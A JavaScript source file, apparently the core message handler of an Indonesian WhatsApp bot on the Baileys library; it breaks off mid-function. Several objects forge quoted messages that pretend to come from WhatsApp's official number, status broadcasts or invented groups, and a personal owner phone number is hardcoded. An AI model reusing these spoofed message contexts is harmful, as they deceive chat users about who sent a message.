

//<---------------------[ const qrcode ]----------------------------->\\
const {// const qrcode-terminal
error
} = require("qrcode-terminal")

//<---------------------[ const color ]----------------------------->\\
const {// const color
color, 
bgcolor,
brightcolor
} = require('./lib/color')

//<---------------------[ const fetcher ]----------------------------->\\
const {// const fetcher
fetchJson,
getBase64,
kyun,
createExif
} = require('./lib/fetcher')

//<---------------------[ const scraper ]----------------------------->\\

const { // const scraper
yta,
ytv, igdl,
upload,
formatDate
} = require('./lib/ytdl')

//<---------------------[ const fuc ]----------------------------->\\
const {// Const Fuction
getBuffer, 
h2k,
generateMessageID,
getGroupAdmins,
getRandom,
banner,
start,
info,
success,
close
} = require('./lib/functions')


//<---------------------[ const totalcmd ]----------------------------->\\
const { // const totalcmd
cmdadd
} = require('./lib/totalcmd.js')

//<---------------------[ const afk ]----------------------------->\\
const { 
sleep,
isAfk,
cekafk,
addafk
} = require('./lib/offline')

//<---------------------[ const voting ]----------------------------->\\
const {
addVote,
delVote
} = require('./lib/vote')

//<---------------------[ const mp3/mp4 ]----------------------------->\\
const {
y2mateA,
y2mateV
} = require('./lib/y2mate')

//<---------------------[ const jadibot ]----------------------------->\\
const {
jadibot,
stopjadibot,
listjadibot
} = require('./lib/jadibot')

//<---------------------[ webp gif ]----------------------------->\\
const { 
webp2mp4Url,
webp2gifFile,
reverseVideoFile,
voiceremover
} = require('./lib/ezgif')


//<---------------------[ const tictac ]----------------------------->\\
const {
validmove,
setGame
} = require("./lib/tictactoe");

//<---------------------[ const limit ]----------------------------->\\

const {
isLimit,
limitAdd,
getLimit,
giveLimit,
addBalance,
kurangBalance,
getBalance,
isGame,
gameAdd,
givegame,
cekGLimit
} = require("./lib/limit");

//<---------------------[ const simple ]----------------------------->\\

const {
smsg,
serializeM
} = require('./src/.dat/simple')

//<---------------------[ modul ]----------------------------->\\
const hx = require('hxz-api')
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const imgbb = require('imgbb-uploader')
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const axios = require("axios")
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const ig = require('insta-fetcher')
const emoji = new EmojiAPI()
const fetch = require('node-fetch');
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const imageToBase64 = require('image-to-base64');
const ID3Writer = require('browser-id3-writer');		
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')

//<---------------------[ 3xif ]----------------------------->\\
const Exif = require('./lib/exif');
const exif = new Exif();
//<---------------------[ -------- ]----------------------------->\\

//-----------------------[ CONST ]-------------------------\\
const simple = require("./lib/simple.js");
const voting = JSON.parse(fs.readFileSync('./lib/voting.json'))
let _scommand = JSON.parse(fs.readFileSync('./src/scommand.json'))
const key = JSON.parse(fs.readFileSync('./data/key.json'))
const setting = JSON.parse(fs.readFileSync('./data/settings.json'))
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss") // const waktoo
const afk = JSON.parse(fs.readFileSync('./lib/off.json')) // const afk

//<---------------------[ database ]----------------------------->\\
const limit = JSON.parse(fs.readFileSync('./data/limit.json'));
const premium = JSON.parse(fs.readFileSync('./data/premium.json'))
const balance = JSON.parse(fs.readFileSync('./data/balance.json'));
const bancht = JSON.parse(fs.readFileSync('./data/banchat.json'));
const glimit = JSON.parse(fs.readFileSync('./data/glimit.json'));
const _prem = require("./src/.dat/premium.js");
//================================================\\
//===========[ BATAS SRC NYA NIH ]=================\\
const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
const nsfw = JSON.parse(fs.readFileSync('./src/nsfw.json'))
const gcdetect = JSON.parse(fs.readFileSync('./src/gcdetect.json'))
const antilink = JSON.parse(fs.readFileSync('./src/.dat/antilink.json'))
const _jasa = JSON.parse(fs.readFileSync('./src/.dat/antijualan.json'))
let antiviewonce = JSON.parse(fs.readFileSync('./data/antiviewonce.json'));

//================================[ BATAS SETTINGS ]=============================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================\\

//???-------??? setting name ???-----???\\
fake = 'Diva'
fake2 = 'Diva'
nw = setting.nw
nb = setting.nb
yto = setting.yto
igo = setting.igo
gito = setting.gito

//???-------??? setting shp ???-----???\\
gaya = setting.gaya
shape = setting.shape
bulet = setting.bulet
G = setting.G
way = "```"
adm = setting.adm
own = setting.own
fre = setting.fre
lim = setting.lim
prem = setting.prem
shp = setting.shp
lmtgm = setting.lmtgm

//???-------??? setting nomor ???-----???\\
setgrup = setting.setgrup
ownerNumber = ["6287727925499@s.whatsapp.net"]
nodev = "6287727925499@s.whatsapp.net"
NoBot = setting.NoBot // ini no owner

//???-------??? setting image ???-----???\\
fakereply = fs.readFileSync('./image/fake.jpeg')
fakeimage = fs.readFileSync('./image/thumb.jpeg')
cewe = fs.readFileSync('./image/cewe.jpeg')

//===============================[ AKHIE SETTINGS ]=================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================\\
const
	{
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
	} = require("@adiwajshing/baileys")
numbernye = '0'
waktu = '-'
alasan = '-'
public = false
offline = false


// Prefix

prefixStatus = true;

aread = false
ngetik = false
vn = true
///<-----------------------[ Fuc ]----------------------->\\
let {
gamewaktu,
limitCount

} = require('./data/settings')
const game = require("./lib/game");

let {
    
    hard,
    
    zeks,
    
    xtem,
    
    lol,
    
    tbz,
    LolKey,
    ZiyKey,
    apiAnto,
    ai

} = require('./data/key')

let tebakgambar = [];
let family100 = [];
let mtk = [];
let ckl = [];


//=================================================//
            const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
               //StcCmd
            function Json(objectPromise) {
            var objectString = JSON.stringify(objectPromise, null, 2)
            var parse = util.format(objectString)
            if (objectString == undefined) {
            parse = util.format(objectPromise)
            }
            return reply(parse)
            }
            const scommand = JSON.parse(fs.readFileSync('./src/scommand.json'))
            const addCmd = (id, command) => {
            const obj = { id: id, chats: command }
            scommand.push(obj)
            fs.writeFileSync('./src/scommand.json', JSON.stringify(scommand))
            }
            const getCommandPosition = (id) => {
            let position = null
            Object.keys(scommand).forEach((i) => {
            if (scommand[i].id === id) {
            position = i
            }
            })
            if (position !== null) {
            return position
            }
            }

            const getCmd = (id) => {
            let position = null
            Object.keys(scommand).forEach((i) => {
            if (scommand[i].id === id) {
            position = i
            }
            })
            if (position !== null) {
            return scommand[position].chats
            }
            }
            const checkSCommand = (id) => {
            let status = false
            Object.keys(scommand).forEach((i) => {
            if (scommand[i].id === id) {
            status = true
            }
            })
            return status
            }
    module.exports = ALDI = async (ALDI, mek) => {
	try {
    if (!mek.hasNewMessage) return;
    mek = mek.messages.all()[0];
    if (!mek.message) return;
    if (mek.key && mek.key.remoteJid == "status@broadcast") return;
    global.blocked;
    mek.message = Object.keys(mek.message)[0] === "ephemeralMessage" ? mek.message.ephemeralMessage.message : mek.message;
    const content = JSON.stringify(mek.message);
    const from = mek.key.remoteJid;
    const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product, } = MessageType;
    const type = Object.keys(mek.message)[0];1;
    var prefixRegEx = /^[!&z?=#.+\/]/gi;
    let _chats = type === "conversation" && mek.message.conversation ? mek.message.conversation : type == "imageMessage" && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : type == "videoMessage" && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : type == "extendedTextMessage" && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : type == "buttonsResponseMessage" && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : type == "stickerMessage" && getCmd(mek.message[type].fileSha256.toString("base64")) !== null && getCmd(mek.message[type].fileSha256.toString("base64")) !== undefined ? getCmd(mek.message[type].fileSha256.toString("base64")) : "";
    let prefix = _chats.match(prefixRegEx) ? prefixRegEx.exec(_chats)[0] : "";
    body = type === "conversation" && mek.message.conversation.startsWith(prefix) ? mek.message.conversation : type == "imageMessage" && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : type == "videoMessage" && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : type == "extendedTextMessage" && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : "";
    budy = type === "conversation" ? mek.message.conversation : type === "extendedTextMessage" ? mek.message.extendedTextMessage.text : "";
    let chats = _chats.match(prefixRegEx) ? _chats .split(prefixRegEx) .find((v) => v === _chats.replace(prefixRegEx, "")) : _chats;
    let command = chats.split(/ +/g)[0];
    const args = _chats.trim().split(/ +/).slice(1);
    const isCmd = _chats.match(prefixRegEx) ? prefixRegEx.exec(_chats)["input"]: _chats;
    const q = args.join(" ");
    const botNumber = ALDI.user.jid;
    const botNumberss = ALDI.user.jid + "@c.us";
    const isGroup = from.endsWith("@g.us");
    const sender = mek.key.fromMe ? ALDI.user.jid : isGroup ? mek.participant : mek.key.remoteJid;
    let senderr = mek.key.fromMe ? ALDI.user.jid : mek.key.remoteJid.endsWith("@g.us") ? mek.participant : mek.key.remoteJid;
    const senderNumber = sender.split("@")[0]
            const itsMe = mek.key.fromMe ? true : false
//<---------------------[ JAM By ACHIL ]----------------------------->\\		
        // const waktu
        const time = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const date = new Date().toLocaleDateString()
        const tima = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')         

		
//<---------------------[ cmd By ACHIL ]----------------------------->\\

		var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
		var Link = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
		const messagesCC = pes.slice(0).trim().split(/ +/).shift()

//<---------------------[ autoread By ACHIL ]----------------------------->\\
		if (aread){

	    ALDI.chatRead(from, "read")
		}
		
//<---------------------[ autovn By ACHIL ]----------------------------->\\		
		if (vn) {
		
await ALDI.updatePresence(from, Presence.recording)
		} else if (ngetik) {
		await ALDI.updatePresence(from, Presence.composing)
		}

//========================\\
		const totalchat = await ALDI.chats.all()
	    const m = simple.smsg(ALDI, mek);
		const groupMetadata = isGroup ? await ALDI.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const isOwner = ownerNumber.includes(sender)
        const isVote = isGroup ? voting.includes(from) : false
        const conts = mek.key.fromMe ? ALDI.user.jid : ALDI.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const isPremium = isGroup ? _prem.checkPremiumUser(sender,premium) : false
        const isAntiVO = isGroup ? antiviewonce.includes(from) : false	        
       //====================\\
       const isWelkom = isGroup ? welkom.includes(from) : false

       const isGcdetect = isGroup ? gcdetect.includes(from) : false 
       const pushname = mek.key.fromMe ? ALDI.user.name : conts.notify || conts.vname || conts.name || '-'
       const isAntiLink = isGroup ? antilink.includes(from) : false
       const isjasa = isGroup ? _jasa.includes(from) : false
       const gcounti = setting.gcount
const 
       gcount = isPremium ? gcounti.prem : gcounti.user
            mess = {
			prem: `Fitur Ini Kusus Premium\nmau beli premium?\nchat : wa.me/6287727925499`,
	        limit: `<-------------------[ MAAF KAK LIMIT ABIS ]------------------->`,
			wait: `Tunggu bntr Kak`,
	        success: `succes....`,
     		wrongFormat: `Format salah, coba liat lagi di menu`,

			error: `Error Ngab!!!`,

			lvlon: `Berhasil Mengaktifkan Mode Leveling Di Group Ini???`,

			lvloff: `Berhasil Menonaktifkan Mode Leveling Di Group Ini???`,

			lvlnul: `Level Mu Masih Kosong`,

			baned: `Maaf Kamu Sudah Terbanned!!`,

			group: `Khusus grup ngab...`,
			Iv: ` Linknya error:v`,

			lvlnoon: `Leveling Di Group Belum Diaktifkan`,

			stikga: `Yah Gagal Coba Ulangi Beberapa Saat Lagi`,

			linkga: `Link Tidak Valid`,

			groupo: `Command Ini Khusus Untuk Group`,

			ownerb: `Command Ini Khusus Untuk Owner`,

			ownerg: `Command Ini Khusus Untuk Owner Group`,

			admin: `Command Ini Khusus Untuk Admin`,

			badmin: `BOT Harus Menjadi Admin`,

			}
			
		 // here button function
        selectedButton = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId : ''

        responseButton = (type == 'listResponseMessage') ? mek.message.listResponseMessage.title : ''

        
        const listmsg = (from, title, desc, list) => { // Fixx
            let po = ALDI.prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": "Pilih Disini","footerText": "Jangan Lupa Donasi Ya Kak ???","listType": "SINGLE_SELECT","sections": list}}, {})
            return ALDI.relayWAMessage(po, {waitForAck: true})
        }
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }

        const reply = (teks) => {
        ALDI.sendMessage(from, teks, text,{sendEphemeral : true,quoted : mek, thumbnail : fakereply})
        }
        const textImg = (teks) => {
           return ALDI.sendMessage(from, teks, text, {quoted: mek, thumbnail: fs.readFileSync('./image/fake.jpeg')})
        }
        const sendMess = (hehe, teks) => {
            ALDI.sendMessage(hehe, teks, text)
        }

        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? ALDI.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : ALDI.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
        }
        
   //FAKEREPLY PRODUCT
            const ftoko = {
            key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync(`./image/thumb.jpeg`)},"title": `NGEJUDI GAK BROH?\n${pushname}`,"description": "X -ALDI Team", "currencyCode": "IDR","priceAmount1000": "9999999999","retailerId": "X - ALDI Team","productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}
            //FAKE KONTAK
            const fkontak = { 
            key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./image/thumb.jpeg')}}}
            //FAKE STICKER
            const fsticker = {
            key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},"message": {"stickerMessage": { "url": "https://mmg.whatsapp.net/d/f/Am6FBfNf-E2f1VoGBXkPaNAy7L6Tw_HMavKrHEt48QM4.enc","fileSha256": "Yfj8SW7liSEnDakvyVlXVZQ1LJBC9idn09X7KHe8HTc=","fileEncSha256": "F854aUrzgAkBTOVULpne4oSIi6S04Jo56pjZEo+p+9U=","mediaKey": "Z3nA2asclAAwWHngNO/vJ81qxOE2/0gkEnXak+NxPV4=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.15575-24/12097272_1193895144391295_8973688483514349023_n.enc?ccb=11-4&oh=5a9d7147627a8355569f1a641b9ebee3&oe=60C65E73","fileLength": "7186","mediaKeyTimestamp": "1622815545","isAnimated": false}}}
            //FAKE VN
            const fvn = {
            key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds": "9999999","ptt": "true"}}}
            //FAKE TEXT
            const ftext = {
            key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${fake}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./image/thumb.jpeg')}}}
            //FAKE LIVE ACTION
            const floc2 = {
            key: {"fromMe": false,"participant": `0@s.whatsapp.net`, "remoteJid": "6289530863358-1621036495@g.us" },message: { "liveLocationMessage": { "title":`${fake}`,}}}
            //FAKEREPLY TROLI
            const ftroli = {
            key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : 2021,status: 1,surface : 1,message: `${fake}`,orderTitle: 'Xyz',thumbnail: fs.readFileSync('./image/thumb.jpeg'), sellerJid: '0@s.whatsapp.net'}}}
const fakevn = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
            },
	 message: { 
		"audioMessage": {
            "mimetype":"audio/ogg; codecs=opus",
            "seconds": "99999999999",
            "ptt": "true"
            }
	            } 
            } 
            //FAKEREPLY VIDEO
            const fvideo = {
            key: {fromMe: false,participant: `62895619083555@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '-99999', 'caption': `${fake}`,'jpegThumbnail': fs.readFileSync('./image/thumb.jpeg')}}}
const fvid = {
	 key: { 
	      participant: '0@s.whatsapp.net'
	       },
	 message: { 
            "videoMessage": { 
            "title":"hallo bang",
            "h": `Hmm`, 
            'seconds': '99', 
            'caption': 'ALDO FAUZI',
            'jpegThumbnail': fs.readFileSync('./image/thumb.jpeg')
            }
            }
	            }
            //FAKEREPLY GROUPINVITE
            const fgc = {
            key: {"fromMe": false,"participant": "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "62895619083555-1616169743@g.us","inviteCode": "mememteeeekkeke","groupName": "P", "caption": `${fake}`, 'jpegThumbnail': fs.readFileSync('./image/thumb.jpeg')}}}
            //FAKEREPLY GIF
            const fgif = {
            key: {fromMe: false,participant: `62895619083555@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': `${fake}`,'jpegThumbnail': fs.readFileSync('./image/thumb.jpeg')}}} 
            
        const fakestatus = (teks) => {
            ALDI.sendMessage(from, teks, text, {
            quoted: {
            key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
            },
            message: {
            "imageMessage": {
            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
            "mimetype": "image/jpeg",
            "caption": fake,
            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
            "fileLength": "28777",
            "height": 1080,
            "width": 1079,
            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
            "mediaKeyTimestamp": "1610993486",
            "jpegThumbnail": fs.readFileSync('./image/thumb.jpeg'),
            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
            }
            }
            }
            })
        }
        const fakethumb = (teks, yes) => {
            ALDI.sendMessage(from, teks, image, {thumbnail:fs.readFileSync('./image/fake.jpeg'),quoted:mek,caption:yes})
            
        }
        const fakegroup = (teks) => {
            ALDI.sendMessage(from, teks, text, {
            quoted: {
            key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
            },
            message: {
            "imageMessage": {
            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
            "mimetype": "image/jpeg",
            "caption": fake,
            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
            "fileLength": "28777",
            "height": 1080,
            "width": 1079,
            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
            "mediaKeyTimestamp": "1610993486",
            "jpegThumbnail": fs.readFileSync('./image/thumb.jpeg'),
            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
            }
            }
            }
            })
        }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{	    	
        if(mids.length > 0){		    
        text = normalizeMention(to, text, mids)	    	
        }		    
        const fn = Date.now() / 10000;		    
        const filename = fn.toString()	     	
        let mime = ""		    
        var download = function (uri, filename, callback) {		   
        request.head(uri, function (err, res, body) {			
        mime = res.headers['content-type']			
        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);		   
        });		   
        };		    
        download(url, filename, async function () {		    
        console.log('done');		    
        let media = fs.readFileSync(filename)		    
        let type = mime.split("/")[0]+"Message"		    
        if(mime === "image/gif"){			
        type = MessageType.video			
        mime = Mimetype.gif		    
        }		    
        if(mime.split("/")[0] === "audio"){			
        mime = Mimetype.mp4Audio		    
        }		    
        ALDI.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})		    		    
        fs.unlinkSync(filename)		    
        });	       
        }
      function addMetadata(packname, author) {
      if (!packname) packname = 'WABot';
      if (!author) author = 'Bot';
      author = author.replace(/[^a-zA-Z0-9]/g, '');
      let name = `${author}_${packname}`
      if (fs.existsSync(`./${name}.exif`)) return `./${name}.exif`
      const json = {
      "sticker-pack-name": packname,
      "sticker-pack-publisher": author,
      }
      const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])
      const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]
      let len = JSON.stringify(json).length
      let last
      if (len > 256) {
      len = len - 256
      bytes.unshift(0x01)
      } else {
      bytes.unshift(0x00)
      }
      if (len < 16) {
      last = len.toString(16)
      last = "0" + len
      } else {
      last = len.toString(16)
      }
      const buf2 = Buffer.from(last, "hex")
      const buf3 = Buffer.from(bytes)
      const buf4 = Buffer.from(JSON.stringify(json))
      const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])
      fs.writeFile(`./${name}.exif`, buffer, (err) => {
      return `./${name}.exif`	
	
      })	


      }
			const uploadImages = (buffData, type) => {    
      // eslint-disable-next-line no-async-promise-executor          
      return new Promise(async (resolve, reject) => {        
      const { ext } = await fromBuffer(buffData)       
      const cmd = text.toLowerCase()      
      const filePath = 'utils/tmp.' + ext       
      const _buffData = type ? await resizeImage(buffData, false) : buffData        
      fs.writeFile(filePath, _buffData, { encoding: 'base64' }, (err) => {			
      if (err) return reject(err)
      console.log('Uploading image to telegra.ph server...')			
      const fileData = fs.readFileSync(filePath)			
      const form = new FormData()			
      form.append('file', fileData, 'tmp.' + ext)          
      fetch('https://telegra.ph/upload', {			   
      method: 'POST',           	
      body: form			
      })           	
      .then(res => res.json())           	
      .then(res => {			
      if (res.error) return reject(res.error)			
      resolve('https://telegra.ph' + res[0].src)           	
      })           	
      .then(() => fs.unlinkSync(filePath))			   
      .catch(err => reject(err))			   
      })			 
      })			
      }
           	
      const sendStickerFromUrl = async(to, url) => {           	
      var names = Date.now() / 10000;           	
      var download = function (uri, filename, callback) {			
      request.head(uri, function (err, res, body) {			   
      request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);			
      });           	
      };           	
      download(url, './sticker' + names + '.png', async function () {			
      console.log('selesai');			
      let filess = './sticker' + names + '.png'			
      let asw = './sticker' + names + '.webp'           	   
      exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {			  
      let media = fs.readFileSync(asw)			   
      ALDI.sendMessage(to, media, MessageType.sticker,{quoted:mek})			   
      fs.unlinkSync(filess)			   
      fs.unlinkSync(asw)			
      });           	
      });			
      }

      const sendStickerUrl = async(to, url) => {			
      console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker...'))           	
      var names = getRandom('.webp')           	
      var namea = getRandom('.png')           	
      var download = function (uri, filename, callback) {           	
      request.head(uri, function (err, res, body) {           		
      request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);           	
      });           	
      };           	
      download(url, namea, async function () {           	
      let filess = namea           	
      let asw = names           	
      require('./lib/exif.js')           	
      exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {           	
      exec(`webpmux -set exif ./sticker/data.exif ${asw} -o ${asw}`, async (error) => {           	
      let media = fs.readFileSync(asw)           	
      ALDI.sendMessage(to, media, sticker,{quoted : mek})           	
      console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker...'))
      });           	
      });           	
      });			
      }        
//FUNCTION
            cekafk(afk)
            if (!mek.key.remoteJid.endsWith('@g.us') && offline){
            if (!mek.key.fromMe && !isOwner){
            if (isAfk(mek.key.remoteJid)) return
            addafk(mek.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
            ALDI.sendMessage(mek.key.remoteJid,`@${NoBot} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${NoBot}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./image/thumb.jpeg')}}}})
            }
            }   
        if (mek.key.remoteJid.endsWith('@g.us') && offline) {
        if (!mek.key.fromMe && !isOwner){
        if (mek.message.extendedTextMessage != undefined){
        if (mek.message.extendedTextMessage.contextInfo != undefined){
        if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${NoBot}@s.whatsapp.net`){
        if (isAfk(mek.key.remoteJid)) return
        addafk(mek.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        ALDI.sendMessage(mek.key.remoteJid,`@${NoBot} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${NoBot}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./image/thumb.jpeg')}}}})
          }
        }
            }
          }
        }
      }
    }
    
    function parseMention(text = '') {
    return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')

    }
    
    // Buton location 
        
    const sendButloc = async(from, text1, desc1, gam1, but = [], options = {}) => {
               
    let kme = gam1
               
    ALDI.sendMessage(from, 
    {"contentText": text1,
               
    "footerText": desc1, 
               
    "buttons": but,
               
    "headerType": "LOCATION",
                       
    "locationMessage": {
                   
    "text": "halo",
                   
    "name": "South Brisbane",
                   
    "address": "Cloudflare, Inc",
                   
    "jpegThumbnail": kme               
    }}, MessageType.buttonsMessage, {quoted: ftroli, contextInfo:{mentionedJid: parseMention(text1, desc1)}}, options)  
             
    }             
    
//<------------[ ADVANCE ]----------->\\
//******************** ???Advance??? ********************\\

function monospace(string) {

return '```' + string + '```'

}   


function jsonformat(string) {
